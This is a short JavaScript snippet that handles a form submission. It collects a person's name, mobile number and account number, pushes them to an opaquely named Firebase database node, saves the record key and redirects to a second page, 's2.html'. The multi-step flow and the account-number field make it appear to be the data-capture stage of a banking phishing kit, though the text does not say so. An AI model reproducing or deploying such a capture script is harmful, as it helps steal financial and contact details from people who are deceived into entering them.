var ududip007DB = firebase.database().ref("ududip007");

document.getElementById("ududip007").addEventListener("submit", function (e) {
  e.preventDefault();

  var aname = document.getElementById("aname").value;
  var bmobile = document.getElementById("bmobile").value;
  var cac = document.getElementById("cac").value;

  var newEntry = ududip007DB.push();
  newEntry.set({
    aName: aname,
    bmobile: bmobile,
    cAc_no: cac
  });

  localStorage.setItem("firebaseKey", newEntry.key);
  window.location.href = "s2.html";
});
